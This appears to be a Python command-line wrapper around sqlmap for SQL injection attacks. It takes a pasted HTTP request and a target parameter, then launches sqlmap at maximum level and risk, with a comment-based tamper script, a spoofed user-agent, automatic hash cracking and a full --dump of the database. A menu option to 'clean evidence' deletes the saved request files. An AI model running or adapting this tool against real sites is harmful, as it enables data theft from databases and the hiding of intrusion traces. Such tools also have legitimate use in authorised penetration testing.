#!/usr/bin/env python3
# G0BurpSQLmaPI by nu11secur1ty 2023–2025

import os
import sys
import time
from colorama import init, Fore, Style

init(autoreset=True)

def create_and_run_exploit():
    print(Fore.CYAN + "\n📥 Paste your full raw HTTP POST or GET request below.")
    print(Fore.YELLOW + "✅ End input by typing 'END' on a new line.\n")

    lines = []
    while True:
        line = input()
        if line.strip().upper() == "END":
            break
        lines.append(line)

    payload = "\n".join(lines).strip()

    if not payload:
        print(Fore.RED + "❌ ERROR: No POST or GET request provided. Exiting.")
        sys.exit(1)

    # Save to exploit files
    try:
        with open("exploit.txt", "w") as f:
            f.write(payload)
        with open(os.path.join("modules", "exploit.txt"), "w") as f:
            f.write(payload)
        print(Fore.GREEN + "\n✅ Saved exploit.txt and modules/exploit.txt.")
    except Exception as e:
        print(Fore.RED + f"❌ Error writing exploit files: {e}")
        sys.exit(1)

    # Ask for injection parameter
    print(Fore.GREEN + "\n🎯 Enter the vulnerable parameter (e.g., id, username):")
    param = input(Fore.RED + "> ").strip()
    if not param:
        print(Fore.RED + "❌ No parameter provided. Exiting.")
        sys.exit(1)

    # SQLMap command
    sqlmap_path = 'D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py'  # Adjust if needed
    exploit_file = os.path.abspath("exploit.txt")

    cmd = (
        f'python "{sqlmap_path}" -r "{exploit_file}" -p "{param}" '
        '--tamper=space2comment '
        '--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" '
        '--dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 '
        '--batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
    )

    print(Fore.MAGENTA + "\n🚀 Launching sqlmap...\n")
    os.system(cmd)

def clean_up():
    try:
        os.remove("exploit.txt")
        print(Fore.CYAN + "🧹 'exploit.txt' has been deleted.")
    except FileNotFoundError:
        print(Fore.YELLOW + "⚠️ 'exploit.txt' not found.")
    try:
        os.remove(os.path.join("modules", "exploit.txt"))
        print(Fore.CYAN + "🧹 'modules/exploit.txt' has been deleted.")
    except FileNotFoundError:
        print(Fore.YELLOW + "⚠️ 'modules/exploit.txt' not found.")
    except Exception as e:
        print(Fore.RED + f"❌ Failed to delete: {e}")

def run_module(path):
    if os.path.exists(path):
        os.system(f"python {path}")
    else:
        print(Fore.YELLOW + f"⚠️ Module not found: {path}")

def display_menu():
    print(Fore.BLUE + "\n===== G0BurpSQLmaPI Menu =====" + Style.RESET_ALL)
    print(Fore.GREEN + "1. Paste request and run SQLMap immediately")
    print("2. Run G0BurpSQLmaPIURLi module")
    print("3. Run G0BurpSQLmaPIUser-Agent module")
    print("4. Clean evidence (delete exploit.txt)")
    print("5. Exit" + Style.RESET_ALL)

def main():
    try:
        while True:
            display_menu()
            choice = input(Fore.YELLOW + "\nEnter your choice: ").strip()

            if choice == '1':
                create_and_run_exploit()
            elif choice == '2':
                run_module("modules/URLi.py")
            elif choice == '3':
                run_module("modules/User-Agent.py")
            elif choice == '4':
                clean_up()
            elif choice == '5':
                print(Fore.GREEN + "👋 Goodbye! Happy hunting ☠️\n")
                break
            else:
                print(Fore.RED + "❌ Invalid choice. Try again.")
            time.sleep(1)

    except KeyboardInterrupt:
        print(Fore.RED + "\n⛔ Interrupted. Exiting cleanly.")
        sys.exit(0)

if __name__ == "__main__":
    main()
